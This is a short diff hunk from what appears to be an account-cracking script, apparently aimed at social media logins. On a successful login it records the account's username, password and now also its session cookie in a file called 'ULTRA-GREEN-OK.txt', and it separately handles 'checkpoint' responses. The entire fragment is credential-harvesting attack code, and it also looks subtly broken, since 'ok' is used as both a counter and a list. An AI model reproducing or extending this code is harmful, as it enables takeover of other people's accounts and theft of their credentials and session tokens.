@@ -759,7 +759,7 @@ def m3(idf,pw):
     if 'y' in cokix:
      print(f'\r{gen}{H}'+coki)
     ok+=1 
-    open('/sdcard/ULTRA-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
+    open('/sdcard/ULTRA-GREEN-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
     ok.append(user)
     break
    elif 'checkpoint' in log_cookies:
